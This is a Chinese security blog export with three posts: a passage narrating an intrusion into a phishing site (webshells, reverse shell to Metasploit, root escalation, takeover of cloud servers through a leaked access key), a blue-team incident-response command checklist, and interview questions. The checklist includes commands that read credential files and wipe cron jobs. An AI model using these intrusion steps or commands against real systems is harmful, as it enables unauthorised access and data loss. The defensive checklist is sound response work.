<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f07c8668eefe96f9184b7708050c9f22.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f07c8668eefe96f9184b7708050c9f22.png" alt="img"></a></p>
<p>我们访问一下，发现404</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/7a93e70bced50eca743ba3039ff8abd0.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/7a93e70bced50eca743ba3039ff8abd0.png" alt="img"></a></p>
<p>应该是把后台路径改掉了，不要紧，我们简单尝试一下，发现改为a7了，现在访问a7界面如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f2c9d531038290a4725ffda2d3529d07.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f2c9d531038290a4725ffda2d3529d07.png" alt="img"></a></p>
<p>还是尝试使用备份王的账号密码，发现登陆成功</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623095849-06343e72-f298-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623095849-06343e72-f298-1.png" alt="img"></a></p>
<p>后台也就拿下了。查看信息，发现大部分都是脏数据了。再去问大师傅看看他那里有没有什么信息。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/ccfb8af27bc01af54f30a98849435edf.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/ccfb8af27bc01af54f30a98849435edf.png" alt="img"></a></p>
<p>登陆师傅提供的地址如下</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623095922-19f4d61a-f298-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623095922-19f4d61a-f298-1.png" alt="img"></a></p>
<p>这里还是有一些数据的，还是有上当受骗的，自己的个人信息被骗完了，最后还输入了自己的手机号，接到了验证码，还把验证码提交到了钓鱼网站。腾讯的防盗机制，二次认证也挡不住钓鱼网站套路多。在这里提醒大家一定要提高警惕，提示输入个人信息的地方一定要留个心眼。</p>
<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>现在咱们按照之前的思路Getshell，先压缩，然后将压缩包下载下来。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f86571a15ccf276c01ef173ef7bce475.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/f86571a15ccf276c01ef173ef7bce475.png" alt="img"></a></p>
<p>然后遇到了新的问题，下载下来的文件都是空文件，</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/59006fbef86960f04f9afffac07948e1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/59006fbef86960f04f9afffac07948e1.png" alt="img"></a></p>
<p>没有数据，所以也就无法替换，也就无法Getshell了。这是什么人间疾苦。现在问问大师傅，看看大师傅进行到哪一步了。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/3c4b3cf41d47f0a0b91ddbf31b255b78.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/3c4b3cf41d47f0a0b91ddbf31b255b78.png" alt="img"></a></p>
<p>看来也卡住了，不要灰心，不要放弃任何一个细节，再去看看备份目录，尝试将最初备份文件下载下来，进行查看。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1ba4df4e2d3d7429e269a11e0b71e064.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1ba4df4e2d3d7429e269a11e0b71e064.png" alt="img"></a></p>
<p>功夫不负有心人，成功。</p>
<p>到如下界面替换，上面填写原内容，替换内容填入冰蝎木马。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623095952-2c04fea2-f298-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623095952-2c04fea2-f298-1.png" alt="img"></a></p>
<p>正要尝试替换config.php文件的内容。想着先访问一下,居然出现了大马界面，大师傅先我一步下手了？去问一下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1cc9fe7121438147ef6b0ad6c17d02f9.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1cc9fe7121438147ef6b0ad6c17d02f9.png" alt="img"></a></p>
<p>果然是大师傅干的，没想到冰蝎和哥斯拉的马子已经上去了，爱了爱了。上冰蝎，查看文件管理如下</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/8f96c68091c349ae216e9111934e2c8c.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/8f96c68091c349ae216e9111934e2c8c.png" alt="img"></a></p>
<h3 id="提权之路"><a href="#提权之路" class="headerlink" title="提权之路"></a>提权之路</h3><p>上面我们拿到了webshell，完成了第一步，现在开始提权了，冰蝎为我们提供了反弹shell的功能，这里我们使用冰蝎将shell弹到MSF中。去瞅一眼大师傅进度。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/c630e8deaa9d8228011433377539ce5d.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/c630e8deaa9d8228011433377539ce5d.png" alt="img"></a></p>
<p>这就是大腿的感觉吗？太幸福了。这里说一下提权的思路。msf里面有个可以自动提权的suggester，我们直接选择就可以了，如下</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20220623100025-3f406d44-f298-1.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20220623100025-3f406d44-f298-1.png" alt="img"></a></p>
<p>选择第一个后，开始提权！</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b84da02ab04d2f27986c615b6c84c583.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/b84da02ab04d2f27986c615b6c84c583.png" alt="img"></a></p>
<p>在这里我们也是成功的拿到了服务器的root权限。如下图</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/e06e363a65c57c4249e03371f17a387e.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/e06e363a65c57c4249e03371f17a387e.png" alt="img"></a></p>
<p>拿到root权限就好办事了，查看账户，也是发现了ssh的端口和账号密码，登陆ssh如下:</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1edbfacf99d850ac92491c22f939342a.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1edbfacf99d850ac92491c22f939342a.png" alt="img"></a></p>
<p>因为钓鱼网站是用宝塔搭建的，所以这里看了看宝塔相关信息，包括面板登陆页，账号密码等等。大师傅也是贴心的把拿到的资产都整理好了。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1ff95a49b8ed0f36ba72adb22de3a0b7.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/1ff95a49b8ed0f36ba72adb22de3a0b7.png" alt="img"></a></p>
<p>第一个师傅发第一个json文件中有泄露的Access key 我们可以通过使用相关工具直接接管相关服务器。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/716346c318b691ac71adebf3780a23ad.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/716346c318b691ac71adebf3780a23ad.png" alt="img"></a></p>
<p>网上有现成的工具，如下图，工具链接：<a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/bd43095d10690fb6945317ffd3c44197.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/bd43095d10690fb6945317ffd3c44197.png" alt="img"></a></p>
<p>最后，大师傅贴心的总结了文本，爱了。总结了宝塔，phpmyadmin，SSH等相关资产。</p>
<p><a href="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/4f0e250a70a5e7dd5edcd26cb7ded7ed.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2022/06/4f0e250a70a5e7dd5edcd26cb7ded7ed.png" alt="img"></a></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>关于钓鱼网站的相关内容就分享到这里啦，咱们从最开始的一个Web弱口令，到日穿钓鱼服务器，中间也是几经波折，最后还是幸不辱命，咱们下期见。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>蓝队应急响应梳理清单</title>
    <url>/posts/7235ef7f.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单学习了一下应急响应相关的知识。总结自己实际的攻防经验，虽然参与应急响应的次数有限，但还是有些思路的，当然这也是不够完善的，后面会结合更多的应急响应经历来完善这份清单。</p>
<p>所以只在这里列出一个应急响应清单，方便自查。</p>
<h2 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h2><p>一般受害者主机都属于这三大类:</p>
<h3 id="1-web服务器"><a href="#1-web服务器" class="headerlink" title="1.web服务器"></a>1.web服务器</h3><p>中间件、框架版本、语言（php\jsp\asp)、是否存在弱口令（万能密码）、是否站库分离，登录爆破难度，这些都是我们能够快速了解到的，也是常见的getshell手段。</p>
<p>中间件是为了知道网站的文件架构和历史漏洞等，框架版本落后可能存在nday漏洞，获取网站语言是为了查杀可能存在的webshell，弱口令进入后台上传文件getshell或者直接命令执行，站库分离的话就排除了通过sql注入getshell的可能，登录爆破是否有token、验证码、错误次数限制等。</p>
<h3 id="2-远程连接服务器"><a href="#2-远程连接服务器" class="headerlink" title="2.远程连接服务器"></a>2.远程连接服务器</h3><p>Windows远程连接：3389</p>
<p>vnc服务：5901&#x2F;5902 </p>
<p>ssh：22</p>
<p>telnet：23</p>
<p>都存在弱口令爆破的可能，而爆破必定会产生大量失败日志，可以关注近期Windows日志登录失败的ip。</p>
<h3 id="3-数据库服务器"><a href="#3-数据库服务器" class="headerlink" title="3.数据库服务器"></a>3.数据库服务器</h3><p>Mysql：3306</p>
<p>MSSQL：1433&#x2F;1434</p>
<p>Oracle：1512</p>
<p>PostgreSQL：5432</p>
<p>MongoDB：27017</p>
<p>Redis：6379</p>
<p>数据库提权，redis未授权访问写入ssh等。</p>
<h2 id="Windows系统排查"><a href="#Windows系统排查" class="headerlink" title="Windows系统排查"></a>Windows系统排查</h2><p>直接排查危险项：</p>
<h3 id="1-用户信息"><a href="#1-用户信息" class="headerlink" title="1.用户信息"></a>1.用户信息</h3><p>普通用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>

<p>影子用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</span><br></pre></td></tr></table></figure>

<p>D盾</p>
<h3 id="2-进程、服务"><a href="#2-进程、服务" class="headerlink" title="2.进程、服务"></a>2.进程、服务</h3><p>任务管理器有没有占用内存较高的、可疑服务</p>
<p>火绒剑排查可疑进程</p>
<h3 id="3-网络连接"><a href="#3-网络连接" class="headerlink" title="3.网络连接"></a>3.网络连接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p>获得可疑连接的进程号pid后，进一步筛选</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist | findstr pid</span><br></pre></td></tr></table></figure>

<p>得知是哪个进程建立的连接</p>
<h3 id="4-启动项、计划任务"><a href="#4-启动项、计划任务" class="headerlink" title="4.启动项、计划任务"></a>4.启动项、计划任务</h3><p><strong>启动项</strong></p>
<p>任务管理器的启动</p>
<p><strong>计划任务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks</span><br></pre></td></tr></table></figure>

<h3 id="5-日志分析"><a href="#5-日志分析" class="headerlink" title="5.日志分析"></a>5.日志分析</h3><p>打开事件查看器，win+r</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eventvwr</span><br></pre></td></tr></table></figure>

<p><strong>系统日志：</strong></p>
<p>查看日志删除记录，事件ID 104，这个ID记录所有审计日志清除事件，就算入侵者删除了日志，我们也可以初步判定他入侵的时间。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/蓝队应急响应梳理清单/image-20221019210456086.png" alt="image-20221019210456086" style="zoom:50%;" />

<p><strong>安全日志：</strong></p>
<p>事件ID 4624 代表登录成功的用户，如果登录类型是10，说明是远程登录，关于登录类型的说明可自行百度，一般在凌晨登录的都是攻击者。</p>
<p>事件ID 4625，代表登录失败的用户，如果是远程爆破进来的，一定会留下很多爆破失败的痕迹，我们可以在这里查找多次爆破失败的IP，然后再筛查其进行的事件。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/蓝队应急响应梳理清单/image-20221019211405485.png" alt="image-20221019211405485" style="zoom:50%;" />

<p>如果上面不好找或者不是通过远程爆破进来的，他一定会进行创建用户账号、修改密码等操作。</p>
<p>事件ID：4720,4722,4723,4724,4725,4726,4738,4740 代表当用户账号发生创建，删除，改变密码时的事件记录。</p>
<p>事件ID: 4727,4737,4729,4762 代表当用户组发生添加、删除时或组内添加成员时生成该事件。</p>
<h3 id="6-自动化日志提取分析工具"><a href="#6-自动化日志提取分析工具" class="headerlink" title="6.自动化日志提取分析工具"></a>6.自动化日志提取分析工具</h3><p><a href="https://github.com/ahmedkhlief/APT-Hunter">APT-Hunter</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1799007">中文README翻译</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1799448">其他翻译</a></p>
<p><a href="https://github.com/dogadmin/windodws-logs-analysis">快速分析日志小工具</a></p>
<p>正确的使用可以快速杀死比赛</p>
<h3 id="7-病毒查杀"><a href="#7-病毒查杀" class="headerlink" title="7.病毒查杀"></a>7.病毒查杀</h3><p>360</p>
<h3 id="8-木马查杀"><a href="#8-木马查杀" class="headerlink" title="8.木马查杀"></a>8.木马查杀</h3><p><a href="https://www.d99net.net/">D盾防火墙</a></p>
<p><strong>内存马查杀</strong></p>
<p><a href="https://github.com/wuppp/releaseBehinderShell">卸载冰蝎内存马</a></p>
<p>首先查看机器进程，找到Tomcat或者Weblogic进程ID，如下为查找Tocmat进程ID</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -el | grep org.apache.catalina.startup.Bootstrap</span><br></pre></td></tr></table></figure>

<p>运行卸载内存马程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -jar releaseBehinderShell-1.0-SNAPSHOT-jar-with-dependencies.jar [pid]</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a></p>
<p>通过jsp脚本扫描并查杀各类中间件内存马，比Java agent要温和一些。</p>
<h2 id="Linux系统排查"><a href="#Linux系统排查" class="headerlink" title="Linux系统排查"></a>Linux系统排查</h2><h3 id="1-账号安全"><a href="#1-账号安全" class="headerlink" title="1.账号安全"></a>1.账号安全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who 查看当前登录用户（tty本地登陆 pts远程登录）</span><br><span class="line">w 查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime 查看登陆多久、多少用户，负载</span><br><span class="line">last 最近登录的用户</span><br></pre></td></tr></table></figure>

<p>快速列出所有所有 uid 为0的用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|awk -F: &#x27;$3==0&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>快速列出可以远程登录账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow|awk &#x27;/$1|$6/&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="2-历史记录"><a href="#2-历史记录" class="headerlink" title="2.历史记录"></a>2.历史记录</h3><p>root用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>

<p>其他用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /home/username/.bash_history</span><br></pre></td></tr></table></figure>

<h3 id="3-检查异常进程、端口"><a href="#3-检查异常进程、端口" class="headerlink" title="3.检查异常进程、端口"></a>3.检查异常进程、端口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more</span><br><span class="line">或者</span><br><span class="line">ps aux | grep root</span><br></pre></td></tr></table></figure>

<p>查看下pid所对应的进程文件路径，（$PID 为对应的pid 号）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /proc/$PID/exe</span><br><span class="line">或</span><br><span class="line">file /proc/$PID/exe</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A2%B3%E7%90%86%E6%B8%85%E5%8D%95/image-20221019221015371.png" alt="image-20221019221015371"></p>
<h3 id="4-检查开机启动项"><a href="#4-检查开机启动项" class="headerlink" title="4.检查开机启动项"></a>4.<strong>检查开机启动项</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开机启动配置文件</span><br><span class="line">cat /etc/rc.local</span><br><span class="line">cat /etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure>

<h3 id="5-检查定时任务"><a href="#5-检查定时任务" class="headerlink" title="5.检查定时任务"></a>5.<strong>检查定时任务</strong></h3><p>Tips：默认编写的crontab文件会保存在 (&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 例如: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
<p><code>crontab -r</code> 删除每个用户cront任务(谨慎：删除所有的计划任务)</p>
<p><code>crontab -e</code> 使用编辑器编辑当前的crontab文件</p>
<p>如：<code>*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt</code> 每分钟写入文件</p>
<p>列出某个用户cron服务的详细内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
<p><strong>重点关注</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>

<h3 id="6-检查服务"><a href="#6-检查服务" class="headerlink" title="6.检查服务"></a>6.<strong>检查服务</strong></h3><p>查看系统运行的服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list </span><br></pre></td></tr></table></figure>

<h3 id="7-Linux日志分析"><a href="#7-Linux日志分析" class="headerlink" title="7.Linux日志分析"></a>7.Linux日志分析</h3><p>日志文件与说明</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A2%B3%E7%90%86%E6%B8%85%E5%8D%95/image-20221019222011394.png" alt="image-20221019222011394"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A2%B3%E7%90%86%E6%B8%85%E5%8D%95/image-20221019222028814.png" alt="image-20221019222028814"></p>
<h3 id="8-快速应急小工具"><a href="#8-快速应急小工具" class="headerlink" title="8.快速应急小工具"></a>8.快速应急小工具</h3><p><a href="https://github.com/grayddq/GScan">GScan</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A2%B3%E7%90%86%E6%B8%85%E5%8D%95/image-20221019222532076.png" alt="image-20221019222532076"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:grayddq/GScan.git</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/al0ne/LinuxCheck">LinuxCheck</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A2%B3%E7%90%86%E6%B8%85%E5%8D%95/image-20221019222509960.png" alt="image-20221019222509960"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:al0ne/LinuxCheck.git</span><br></pre></td></tr></table></figure>

<h3 id="9-病毒-x2F-恶意软件查杀"><a href="#9-病毒-x2F-恶意软件查杀" class="headerlink" title="9.病毒&#x2F;恶意软件查杀"></a>9.病毒&#x2F;恶意软件查杀</h3><p><a href="http://www.clamav.net/download.html">clamav</a></p>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y clamav</span><br></pre></td></tr></table></figure>



<p><a href="http://www.chkrootkit.org/">chkrootkit</a></p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br></pre></td></tr></table></figure>

<h3 id="10-webshell查杀"><a href="#10-webshell查杀" class="headerlink" title="10.webshell查杀"></a>10.webshell查杀</h3><p>快速查找1小时内修改的jsp文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find [扫描路径] -type f -mmin -60 -name &quot;*.jsp&quot;</span><br></pre></td></tr></table></figure>

<p><a href="http://www.shellpub.com/">河马webshell查杀</a></p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -O /opt/hm-linux.tgz http://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.7.0</span><br></pre></td></tr></table></figure>

<p><a href="http://edr.sangfor.com.cn/backdoor_detection.html">深信服 webshell 扫描工具</a></p>
]]></content>
      <categories>
        <category>BlueTeam</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础面试题目</title>
    <url>/posts/8705ee3d.html</url>
    <content><![CDATA[<h2 id="✍前言"><a href="#✍前言" class="headerlink" title="✍前言"></a>✍前言</h2><p>简单的过一遍基础面试题目。</p>
<h2 id="1-同源策略以及绕过此限制的方法"><a href="#1-同源策略以及绕过此限制的方法" class="headerlink" title="1.同源策略以及绕过此限制的方法"></a>1.同源策略以及绕过此限制的方法</h2><p><a href="https://blog.csdn.net/duzm200542901104/article/details/85870019">https://blog.csdn.net/duzm200542901104/article/details/85870019</a></p>
<h2 id="2-三大数据库写马方式"><a href="#2-三大数据库写马方式" class="headerlink" title="2.三大数据库写马方式"></a>2.三大数据库写马方式</h2><p><a href="https://fstraw.cn/posts/ffe60f3c.html">https://fstraw.cn/posts/ffe60f3c.html</a></p>
<h2 id="3-代码审计的思路"><a href="#3-代码审计的思路" class="headerlink" title="3.代码审计的思路"></a>3.代码审计的思路</h2><ol>
<li>寻找敏感功能点</li>
<li>根据敏感关键字回溯</li>
<li>直接通读全文代码</li>
<li>查找可控变量，正向追踪变量传递过程</li>
</ol>
<h2 id="4-应急响应思路"><a href="#4-应急响应思路" class="headerlink" title="4.应急响应思路"></a>4.应急响应思路</h2><p>断开异常连接、排查入侵源头、避免二次入侵</p>
<p><strong>一、发现异常点</strong></p>
<ol>
<li><p>网站部分：篡改、丢失乱码</p>
</li>
<li><p>文件部分：丢失、篡改、泄露</p>
</li>
<li><p>系统部分：系统卡顿、CPU爆满、服务宕机</p>
</li>
<li><p>流量部分：大量数据包、陌生外部连接、网速网络卡顿</p>
</li>
<li><p>第三方服务部分：服务异常、运行异常</p>
</li>
</ol>
<p><strong>二、收集信息</strong></p>
<ol>
<li><p>操作系统：linux、windows、mac</p>
</li>
<li><p>具体收集内容：对外服务、开放端口、系统版本、网络环境、漏洞情况、软件平台、口令整理、有无防护</p>
</li>
<li><p>具体什么时间段出现异常</p>
</li>
</ol>
<p><strong>1.WEB漏洞-检查源码类别及漏洞情况</strong></p>
<p>**2.**<strong>中间件漏洞-检查对应版本及漏洞情况</strong></p>
<p>**3.**<strong>第三方应用漏洞-检查是否存在漏洞应用</strong></p>
<p>**4.**<strong>操作系统层面漏洞-检查是否存在系统漏洞</strong></p>
<p>**5.**<strong>其他安全问题(口令,后门等)-检查相关应用口令及后门扫描</strong></p>
<p><strong>三、模拟攻击</strong></p>
<ol>
<li><p>web攻击：漏洞攻击、结合攻击、流量攻击</p>
</li>
<li><p>第三方攻击：数据库、远程网站、服务平台</p>
</li>
<li><p>操作系统攻击：权限提升、<a href="https://so.csdn.net/so/search?q=%E5%86%85%E7%BD%91&spm=1001.2101.3001.7020">内网</a>渗透、远程漏洞</p>
</li>
</ol>
<p>基于时间   基于操作   基于指纹   基于其他</p>
<p>告诉你什么时间出现异常，就可以筛选时间         减少看垃圾日志浪费的时间</p>
<p>客户告诉你他的数据库崩了（数据更改了）          数据库安全问题</p>
